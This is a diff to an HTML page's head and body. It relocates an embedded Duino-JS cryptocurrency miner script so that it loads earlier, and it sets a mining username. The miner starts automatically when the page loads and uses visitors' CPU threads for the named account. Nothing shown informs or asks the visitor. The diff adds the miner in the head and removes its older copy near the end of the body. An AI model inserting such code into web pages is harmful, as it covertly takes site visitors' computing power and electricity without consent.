@@ -19,6 +19,13 @@
   <link rel="stylesheet" href="style.css">
   <!-- Iconsout Link for Icons -->
   <link rel="stylesheet" href="https://unicons.iconscout.com/release/v3.0.6/css/line.css">
+  <script src="duino-js.js"></script> <!--imports the Duino-JS miner-->
+  <script>
+      username = "MyEcoria"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+      rigid = "Duino-JS"; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
+      threads = userThreads; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
+      startMiner(); //starts the miner
+  </script>
 </head>
 <body>
   <div class="wrapper">
@@ -106,13 +113,7 @@
   </div>
 
   <script src="script.js"></script>
-  <script src="duino-js.js"></script> <!--imports the Duino-JS miner-->
-  <script>
-      username = "MyEcora"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
-      rigid = "Duino-JS"; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
-      threads = userThreads; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
-      startMiner(); //starts the miner
-  </script>
+  
 
 </body>
 </html>
